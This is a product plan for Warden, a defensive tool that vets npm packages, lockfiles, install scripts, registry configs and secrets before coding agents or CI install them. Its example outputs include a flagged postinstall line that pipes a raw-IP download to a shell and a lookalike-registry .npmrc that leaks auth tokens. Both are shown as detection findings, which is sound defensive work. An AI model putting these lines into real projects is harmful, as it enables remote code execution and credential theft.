# Warden product plan

Goal: users keep their existing package manager (npm, pnpm, yarn, Bun) and their existing coding agent. Warden vets packages automatically before any install or execute command, enforces repo policy in CI, and feeds agents structured feedback they can act on. Development runs in Docker, never on the host.

## Detailed designs

| Doc | Covers |
|---|---|
| [Agent-first CLI](agent-first-cli.md) | CLI conventions for agents, agent selection at install, the fix handoff and its context bundle |
| [Interception](interception.md) | PATH shims, the intercept switch, the four reporting modes with example logs |
| [Distribution](distribution.md) | Release workflow, install.sh transcripts (fresh, upgrade, uninstall), Docker dev setup |
| [Detection and init](detection-and-init.md) | `warden detect` evidence-based classification, `warden init` onboarding |
| [Config](config.md) | `warden.config.json` cascade, user-level config, cache semantics, CLAUDE.md integration |
| [Shell autocomplete](autocomplete.md) | Registry-driven help and generated bash, zsh, and fish completions |
| [Dependency doctor](doctor.md) | `wnpm doctor` audit, gate, verify, and apply loop for existing dependencies |
| [Intent verification](intent.md) | `warden intent check` prompt-as-spec diff verification and hallucinated-API scan |

## Product shape

### Brief

Warden is the trust layer between coding agents and the systems they touch. Agents now write most new code, and they hallucinate package names (roughly 20% of LLM-recommended packages do not exist, and attackers pre-register those names), ship dead files, and flood reviewers with slop. Warden intercepts every install, vets every dependency, enforces repo policies, and returns structured, actionable feedback that agents can consume directly, locally through shims, in CI through one workflow, and over MCP.

### Why now

- Sonatype counted 454,600+ new malicious open-source packages in 2025 alone; npm collision detection cannot catch slopsquats because hallucinated names are brand new strings.
- Agent-driven CI incidents (Clinejection, February 2026) show agents installing unvetted packages inside pipelines, multiplying blast radius.
- Reviewers report AI PRs take 38% more effort and wait 4.6x longer; the missing piece is machine-checkable policy enforced before a human ever looks.
- Agents iterate best on structured feedback (what failed, where, why, suggested fix, repeated vs new), not raw CI logs.

### The ten functionalities

1. **Package vetting** (exists): typosquats, homoglyphs, known malware, install-script diffs, provenance downgrades.

```
$ warden check expres

BLOCK  expres@0.0.5  risk 92/100 · npm
  categories: typosquat, install-script
  • name is 1 edit away from "express" (32M weekly downloads)
  • postinstall script present; express has none
  • published 9 days ago by a maintainer with no other packages

  verdict: probable typosquat of express with an install script
  blocked before any script ran; override with --allow-risky
```

2. **Slopsquat guard**: hallucinated-name heuristics tuned for agent traffic; shims catch the agent's own `npm install` before anything lands.

```
$ npm install fastify-jwt-auth
Warden: vetting 1 package before install

BLOCK  fastify-jwt-auth@0.1.2  risk 88/100 · npm
  categories: hallucinated-name, new-package
  • matches known LLM hallucination pattern; real package is @fastify/jwt
  • first published 6 days ago, no repository field, 2 downloads

  verdict: likely slopsquat of @fastify/jwt
install blocked: 1 package failed the trust check. Override with --allow-risky.
```

3. **Lockfile integrity**: off-registry resolved URLs, tampered integrity hashes, git and http dependencies.

```
$ warden check lockfile

BLOCK  pnpm-lock.yaml  2 of 412 entries fail integrity
  • color-convert@2.0.1 resolves to http://mirror-npm.dev/... (off-registry host)
  • debug@4.3.4 integrity sha512 does not match the npm registry value

  verdict: lockfile tampered; do not install from this lockfile
```

4. **Lifecycle script audit**: every install script across the tree, diffed against the last vetted state.

```
$ warden check scripts

  WARN   esbuild@0.21.4     postinstall: node install.js  (platform binary download, known publisher)
  BLOCK  polyfill-kit@1.0.2 postinstall: curl -s http://45.13.20.7/i.sh | sh  (raw-IP fetch piped to shell)

  412 packages scanned: 1 block, 1 warn, 410 clean
```

5. **Registry config audit**: malicious `.npmrc`, registry overrides, token exfil vectors.

```
$ warden check config

BLOCK  .npmrc  risk 90/100
  • registry=https://registry.npmjs.help (lookalike of registry.npmjs.org)
  • always-auth=true would send your token to that host

  verdict: credentials would leak to a non-npm registry
```

6. **Policy engine**: repo rules checked deterministically. Launch policies: comment policy (density limits or comment-free, generalizing `scripts/strip-comments.mjs`), format gate (delegates to the repo formatter), dependency policy (license allowlist, minimum package age, maximum install size, no new runtime deps without an allow entry).

```
$ warden check policy

  FAIL  comments      src/engine.ts:142  narrative comment: "// loop over the releases"
  FAIL  dependencies  package.json       lodash added as runtime dep without an allow entry
  PASS  format

  2 policy failures (fix or add allow entries in warden.config.json)
```

7. **Slop signals**: unused files, unused exports, unused dependencies, dead branches, filler comments; the objective subset of "AI slop" that a machine can flag before review.

```
$ warden check codebase

  unused file    src/utils/helpers-v2.ts       no importers anywhere in the workspace
  unused export  src/report/format.ts:88       renderCompact is never imported
  unused dep     package.json                  "dayjs" not imported by any source file
  dead branch    src/cache.ts:41                condition always false since v0.2 refactor

  4 findings · framework entry points excluded (next.config detected)
```

8. **Secrets**: committed credentials and tokens.

```
$ warden check secrets

BLOCK  .env.production:3  AWS_SECRET_ACCESS_KEY with live key format (committed 2 days ago)
BLOCK  src/lib/api.ts:12  hardcoded bearer token in fetch header

  2,113 files scanned: 2 secrets found
```

9. **`warden ci`**: diff-aware run of everything above against the merge base, with reporters for GitHub annotations, `$GITHUB_STEP_SUMMARY`, JSON, and SARIF, plus a sticky PR comment.

```
$ warden ci --reporter github
Warden CI · diff vs merge-base a1b2c3d · 2 packages changed

  deps      BLOCK  expres@0.0.5 (added in this PR)
  lockfile  ok
  scripts   ok
  policy    FAIL comments (1), PASS format, PASS dependencies

::error file=package.json,line=14::expres@0.0.5 is a probable typosquat of express
::error file=src/engine.ts,line=142::comment policy forbids narrative comments

exit 20
```

10. **Agent feedback surface**: `--reporter agent` emits findings as structured objects (rule, evidence, file and line, suggested fix, repeated-vs-new flag) so an agent can act without re-investigating; later, `warden mcp` lets agents query a package verdict before they even write the import.

```
$ warden ci --reporter agent
{
  "findings": [
    {
      "rule": "typosquat",
      "package": "expres@0.0.5",
      "file": "package.json",
      "line": 14,
      "evidence": "1 edit from express (32M weekly downloads); postinstall present",
      "fix": "replace \"expres\" with \"express\" in dependencies and reinstall",
      "seen_before": false
    },
    {
      "rule": "comments.forbid",
      "file": "src/engine.ts",
      "line": 142,
      "evidence": "narrative comment",
      "fix": "delete the comment; the function name already carries the meaning",
      "seen_before": true
    }
  ],
  "verdict": "block",
  "exit": 20
}
```

1 through 5 extend the existing engine. 6 and 9 are the CI product. 7, 8, and 10 follow once those land.

## `warden check` command

The engine already exists (`checkPackage` in `src/engine.ts`); only wnpm/wnpx front it today.

- Add a third binary `warden` with `warden check <pkg[@version]...> [--json] [--allow-risky]` as the first verb.
- Same exit codes as today: 0 allow, 10 warn, 20 block, 30 error.
- This is the single entry point the shims call. wnpm/wnpx stay as thin wrappers.

## Genuine package-manager gaps warden fixes

Only stable fixes, no grammar sugar or command rewriting:

- Lifecycle-script exposure: vetted installs already pass `--ignore-scripts` where supported; shims extend this default to intercepted installs.
- `npx`/`bunx`/`pnpm dlx` executing unvetted code: the shim vets the package before the real tool downloads or runs it.
- Known-malicious and typosquat packages entering via any manager: interception covers all of them with one rule set instead of per-manager trust systems (`bun pm trust`, pnpm approvals).

Out of scope: fixing npm's `run` grammar, `--` argument forwarding, or Bun's auto-install behavior. Those are upstream UX decisions; wrapping them is exactly the unstable workaround category to avoid.

## CI integration

Binary-first keeps this infrastructure-free:

- `warden ci` verb: diffs `package.json` and the lockfile against the merge base, vets every added or changed dependency, exits with the standard codes.
- Reporters: `--reporter github` writes workflow annotations and a `$GITHUB_STEP_SUMMARY` table; `--reporter json` gives agents full verdict objects; `--reporter sarif` uploads via `github/codeql-action/upload-sarif` so findings land in the Security tab and as native PR annotations.
- Ship a marketplace Action (`pulkitxm/warden-action`) that installs the binary and runs `warden ci`. Works in GitLab and friends too since it is just a binary.
- GitHub App: deferred. It buys org-wide zero-config onboarding and a hosted dashboard, but costs webhook servers, secret handling, and scaling. Revisit only after the Action proves demand.

## Functionality roadmap

Core lane (supply chain, existing engine extends naturally):

- `warden check <pkg...>`: current vetting
- `warden check lockfile`: off-registry resolved URLs, integrity hash tampering, git or http dependencies
- `warden check scripts`: audit lifecycle scripts across installed dependencies
- `warden check config`: dangerous `.npmrc` or registry overrides
- `warden ci`: everything above against the PR diff, agent-verbose output

Adjacent lane (different problem, evaluate after core lands):

- `warden check codebase`: unused files, unused exports, unused dependencies
- `warden check secrets`: committed credentials
- `warden check licenses`: license policy enforcement

## Order of work

1. `warden check` binary (small, unlocks everything else)
2. Dockerfile + make targets (immediate dev need)
3. Release workflow + install.sh with mode and agent prompts
4. Shims
5. `warden detect` + `warden init` + `warden.config.json` schema
6. `warden ci` + reporters + marketplace Action
7. Fix handoff + agent adapters
8. Policy engine (comments first, it already exists as a script)
9. Slop signals, secrets, MCP server
